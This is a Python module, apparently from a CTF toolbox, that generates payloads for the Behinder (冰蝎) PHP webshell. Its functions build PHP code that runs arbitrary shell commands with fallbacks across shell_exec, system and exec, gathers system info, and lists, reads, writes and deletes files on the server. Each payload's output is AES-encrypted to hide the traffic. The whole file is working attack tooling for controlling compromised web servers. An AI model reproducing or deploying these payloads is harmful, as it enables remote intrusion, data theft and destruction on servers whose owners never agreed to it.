"""冰蝎 PHP 载荷。

约定：参数以 base64 常量烘焙进载荷；载荷执行后用 openssl AES-128-ECB 加密其输出
（返回 base64(raw_ct)，与传输层同密钥），客户端对称解密。首行为机读标签供测试解释器使用。
"""

from __future__ import annotations

import base64

from ...base import Operation


def _b64(value: str | bytes) -> str:
    data = value.encode("utf-8") if isinstance(value, str) else value
    return base64.b64encode(data).decode("ascii")


def _tag(op: str, *b64parts: str) -> str:
    return "/*CTFBOX_BH|" + "|".join((op, *b64parts)) + "*/"


def _wrap(tag: str, body: str, key: str) -> str:
    """公共外壳：设定密钥、执行 body（body 须把结果写入 $o），加密回显。"""
    return (
        f"{tag}\n"
        f"$k=\"{key}\";$o=\"\";\n"
        f"{body}\n"
        f"echo openssl_encrypt($o,\"aes-128-ecb\",$k);"
    )


def render(operation: str, params: dict, key: str) -> str:
    if operation == Operation.SYSINFO:
        tag = _tag(Operation.SYSINFO)
        body = '$o=json_encode(array("os"=>PHP_OS,"user"=>@get_current_user(),"cwd"=>@getcwd()));'
        return _wrap(tag, body, key)

    if operation == Operation.EXEC:
        b = _b64(params["cmd"])
        tag = _tag(Operation.EXEC, b)
        body = (
            f'$c=base64_decode("{b}");'
            'if(function_exists("shell_exec")){$o=@shell_exec($c);}'
            'elseif(function_exists("system")){ob_start();@system($c);$o=ob_get_clean();}'
            'elseif(function_exists("exec")){@exec($c,$r);$o=implode("\\n",$r);}'
            'if($o===null){$o="";}'
        )
        return _wrap(tag, body, key)

    if operation == Operation.LIST:
        b = _b64(params.get("path", "."))
        tag = _tag(Operation.LIST, b)
        body = (
            f'$p=base64_decode("{b}");$d=@opendir($p);'
            'if($d){while(($f=readdir($d))!==false){if($f=="."||$f=="..")continue;'
            '$fp=rtrim($p,"/")."/".$f;$t=@is_dir($fp)?"dir":"file";$s=@is_file($fp)?@filesize($fp):0;'
            '$o.=$f."\\t".$t."\\t".$s."\\n";}closedir($d);}'
        )
        return _wrap(tag, body, key)

    if operation == Operation.READ:
        b = _b64(params["path"])
        tag = _tag(Operation.READ, b)
        body = f'$p=base64_decode("{b}");$c=@file_get_contents($p);$o=base64_encode($c===false?"":$c);'
        return _wrap(tag, body, key)

    if operation == Operation.WRITE:
        bp = _b64(params["path"])
        bc = params["content"]  # 已是 base64（引擎上层传入 base64 内容）
        tag = _tag(Operation.WRITE, bp, bc)
        body = (
            f'$p=base64_decode("{bp}");$data=base64_decode("{bc}");'
            '$n=@file_put_contents($p,$data);$o=(string)($n===false?-1:$n);'
        )
        return _wrap(tag, body, key)

    if operation == Operation.DELETE:
        b = _b64(params["path"])
        tag = _tag(Operation.DELETE, b)
        body = f'$p=base64_decode("{b}");$o=(string)(@unlink($p)?1:0);'
        return _wrap(tag, body, key)

    raise ValueError(f"冰蝎 PHP 载荷不支持操作：{operation}")
